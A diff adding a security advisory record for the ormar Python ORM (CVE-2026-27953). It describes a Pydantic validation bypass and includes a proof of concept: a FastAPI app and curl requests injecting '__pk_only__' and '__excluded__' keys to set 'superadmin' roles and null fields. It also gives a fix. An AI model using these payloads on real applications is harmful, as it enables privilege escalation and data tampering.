@@ -1,0 +1,138 @@
+{
+  "id": "GHSA-f964-whrq-44h8",
+  "modified": "2026-03-19T16:31:31.155853Z",
+  "published": "2026-03-19T16:27:43Z",
+  "aliases": [
+    "CVE-2026-27953"
+  ],
+  "summary": "ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Constructor",
+  "details": "### Summary\n\nA Pydantic validation bypass in `ormar`'s model constructor allows any unauthenticated user to skip **all** field validation — type checks, constraints, `@field_validator`/`@model_validator` decorators, choices enforcement, and required-field checks — by injecting `\"__pk_only__\": true` into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the **canonical usage pattern** recommended in ormar's official documentation and examples.\n\nA secondary `__excluded__` parameter injection uses the same design pattern to selectively nullify arbitrary model fields during construction.\n\n### Details\n\n**Root cause:** `NewBaseModel.__init__` ([`ormar/models/newbasemodel.py`, line 128](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L128)) pops `__pk_only__` directly from user-supplied `**kwargs` before any validation occurs:\n\n```python\n# ormar/models/newbasemodel.py, lines 128-142\npk_only = kwargs.pop(\"__pk_only__\", False)      # ← extracted from user kwargs\nobject.__setattr__(self, \"__pk_only__\", pk_only)\n\nnew_kwargs, through_tmp_dict = self._process_kwargs(kwargs)\n\nif not pk_only:\n    # Normal path: full Pydantic validation\n    new_kwargs = self.serialize_nested_models_json_fields(new_kwargs)\n    self.__pydantic_validator__.validate_python(\n        new_kwargs, self_instance=self\n    )\nelse:\n    # Bypass path: NO validation at all\n    fields_set = {self.ormar_config.pkname}\n    values = new_kwargs\n    object.__setattr__(self, \"__dict__\", values)       # raw dict written directly\n    object.__setattr__(self, \"__pydantic_fields_set__\", fields_set)\n```\n\nThe `__pk_only__` flag was designed as an internal optimization for creating lightweight FK placeholder instances in [`ormar/fields/foreign_key.py` (lines 41, 527)](https://github.com/collerek/ormar/blob/master/ormar/fields/foreign_key.py#L41). However, because it is extracted from `**kwargs` via `.pop()` with a `False` default, any external caller that passes user-controlled data to the model constructor can inject this flag.\n\n**Why the canonical FastAPI + ormar pattern is vulnerable:**\n\nOrmar's official example ([`examples/fastapi_quick_start.py`, lines 55-58](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py#L55)) recommends using ormar models directly as FastAPI request body parameters:\n\n```python\n@app.post(\"/items/\", response_model=Item)\nasync def create_item(item: Item):\n    await item.save()\n    return item\n```\n\nFastAPI parses the JSON body and calls `TypeAdapter.validate_python(body_dict)`, which triggers ormar's `__init__`. The `__pk_only__` key is popped at line 128 **before** Pydantic's validator inspects the data, so Pydantic never sees it — even `extra='forbid'` would not prevent this, because the key is already consumed by ormar.\n\nThe ormar Pydantic `model_config` (set in [`ormar/models/helpers/pydantic.py`, line 108](https://github.com/collerek/ormar/blob/master/ormar/models/helpers/pydantic.py#L108)) does not set `extra='forbid'`, providing no protection even in theory.\n\n**What is bypassed when `__pk_only__=True`:**\n- All type coercion and type checking (e.g., string for int field)\n- `max_length` constraints on String fields\n- `choices` constraints\n- All `@field_validator` and `@model_validator` decorators\n- `nullable=False` enforcement at the Pydantic level\n- Required-field enforcement (only `pkname` is put in `fields_set`)\n- `serialize_nested_models_json_fields()` preprocessing\n\n**Save path persists unvalidated data to the database:**\n\nAfter construction with `pk_only=True`, calling `.save()` ([`ormar/models/model.py`, lines 89-107](https://github.com/collerek/ormar/blob/master/ormar/models/model.py#L89)) reads fields directly from `self.__dict__` via `_extract_model_db_fields()`, then executes `table.insert().values(**self_fields)` — persisting the unvalidated data to the database with no re-validation.\n\n**Secondary vulnerability — `__excluded__` injection:**\n\nThe same pattern applies to `__excluded__` at [`ormar/models/newbasemodel.py`, line 292](https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L292):\n\n```python\nexcluded: set[str] = kwargs.pop(\"__excluded__\", set())\n```\n\nAt lines 326-329, fields listed in `__excluded__` are silently set to `None`:\n\n```python\nfor field_to_nullify in excluded:\n    new_kwargs[field_to_nullify] = None\n```\n\nAn attacker can inject `\"__excluded__\": [\"email\", \"password_hash\"]` to nullify arbitrary fields during construction.\n\n**Affected entry points:**\n\n| Entry Point | Exploitable? |\n|---|---|\n| `async def create_item(item: Item)` (FastAPI route) | Yes |\n| `Model.objects.create(**user_dict)` | Yes |\n| `Model(**user_dict)` | Yes |\n| `Model.model_validate(user_dict)` | Yes |\n\n### PoC\n\n**Step 1: Create a FastAPI + ormar application using the canonical pattern from ormar's docs:**\n\n```python\n# app.py\nfrom contextlib import asynccontextmanager\nimport sqlalchemy\nimport uvicorn\nfrom fastapi import FastAPI\nimport ormar\n\nDATABASE_URL = \"sqlite+aiosqlite:///test.db\"\normar_base_config = ormar.OrmarConfig(\n    database=ormar.DatabaseConnection(DATABASE_URL),\n    metadata=sqlalchemy.MetaData(),\n)\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    database_ = app.state.database\n    if not database_.is_connected:\n        await database_.connect()\n    # Create tables\n    engine = sqlalchemy.create_engine(DATABASE_URL.replace(\"+aiosqlite\", \"\"))\n    ormar_base_config.metadata.create_all(engine)\n    engine.dispose()\n    yield\n    database_ = app.state.database\n    if database_.is_connected:\n        await database_.disconnect()\n\napp = FastAPI(lifespan=lifespan)\ndatabase = ormar.DatabaseConnection(DATABASE_URL)\napp.state.database = database\n\nclass User(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"users\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=50)\n    email: str = ormar.String(max_length=100)\n    role: str = ormar.String(max_length=20, default=\"user\")\n    balance: int = ormar.Integer(default=0)\n\n# Canonical ormar pattern from official examples\n@app.post(\"/users/\", response_model=User)\nasync def create_user(user: User):\n    await user.save()\n    return user\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n```\n\n**Step 2: Send a normal request (validation works correctly):**\n\n```bash\n# This correctly rejects — \"name\" exceeds max_length=50\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",\n    \"email\": \"user@example.com\"\n  }'\n# Returns: 422 Validation Error\n```\n\n**Step 3: Inject `__pk_only__` to bypass ALL validation:**\n\n```bash\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"__pk_only__\": true,\n    \"name\": \"\",\n    \"email\": \"not-an-email\",\n    \"role\": \"superadmin\",\n    \"balance\": -99999\n  }'\n# Returns: 200 OK — all fields persisted to database WITHOUT validation\n# - \"name\" is empty despite being required\n# - \"email\" is not a valid email\n# - \"role\" is \"superadmin\" (bypassing any validator that restricts to \"user\"/\"admin\")\n# - \"balance\" is negative (bypassing any ge=0 constraint)\n```\n\n**Step 4: Inject `__excluded__` to nullify arbitrary fields:**\n\n```bash\ncurl -X POST http://127.0.0.1:8000/users/ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"__excluded__\": [\"email\", \"role\"],\n    \"name\": \"attacker\",\n    \"email\": \"will-be-nullified@example.com\",\n    \"role\": \"will-be-nullified\"\n  }'\n# Returns: 200 OK — email and role are set to NULL regardless of input\n```\n\n### Impact\n\n**Who is impacted:** Every application using ormar's canonical FastAPI integration pattern (`async def endpoint(item: OrmarModel)`) is vulnerable. This is the primary usage pattern documented in ormar's official examples and documentation.\n\n**Vulnerability type:** Complete Pydantic validation bypass.\n\n**Impact scenarios:**\n- **Privilege escalation**: If a model has a `role` or `is_admin` field with a Pydantic validator restricting values to `\"user\"`, an attacker can set `role=\"superadmin\"` by bypassing the validator\n- **Data integrity violation**: Type constraints (`max_length`, `ge`/`le`, regex patterns) are all bypassed — invalid data is persisted to the database\n- **Business logic bypass**: Custom `@field_validator` and `@model_validator` decorators (e.g., enforcing email format, age ranges, cross-field dependencies) are entirely skipped\n- **Field nullification** (via `__excluded__`): Audit fields, tracking fields, or required business fields can be selectively set to NULL\n\n**Suggested fix:**\n\nReplace `kwargs.pop(\"__pk_only__\", False)` with a keyword-only parameter that cannot be injected via `**kwargs`:\n\n```python\n# Before (vulnerable)\ndef __init__(self, *args: Any, **kwargs: Any) -\u003e None:\n    ...\n    pk_only = kwargs.pop(\"__pk_only__\", False)\n\n# After (secure)\ndef __init__(self, *args: Any, _pk_only: bool = False, **kwargs: Any) -\u003e None:\n    ...\n    object.__setattr__(self, \"__pk_only__\", _pk_only)\n```\n\nApply the same fix to `__excluded__`:\n\n```python\n# Before (vulnerable)\nexcluded: set[str] = kwargs.pop(\"__excluded__\", set())\n\n# After (secure) — pass via keyword-only _excluded parameter\ndef __init__(self, *args: Any, _pk_only: bool = False, _excluded: set | None = None, **kwargs: Any) -\u003e None:\n    ...\n    # In _process_kwargs:\n    excludes = _excluded or set()\n```\n\nInternal callers in `foreign_key.py` would pass `_pk_only=True` as a named argument. Keyword-only parameters prefixed with `_` cannot be injected via JSON body deserialization or `Model(**user_dict)` unpacking.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "ormar",
+        "purl": "pkg:pypi/ormar"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.23.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.10.0",
+        "0.10.1",
+        "0.10.10",
+        "0.10.11",
+        "0.10.12",
+        "0.10.13",
+        "0.10.14",
+        "0.10.15",
+        "0.10.16",
+        "0.10.17",
+        "0.10.18",
+        "0.10.19",
+        "0.10.2",
+        "0.10.20",
+        "0.10.21",
+        "0.10.22",
+        "0.10.23",
+        "0.10.24",
+        "0.10.25",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.10.8",
+        "0.10.9",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.12.0",
+        "0.12.1",
+        "0.12.2",
+        "0.12.3",
+        "0.2.1",
+        "0.2.2",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.10",
+        "0.3.11",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.3.8",
+        "0.3.9",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.7.5",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.23.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-f964-whrq-44h8/GHSA-f964-whrq-44h8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/ormar-orm/ormar"
+    }
+  ]
+}
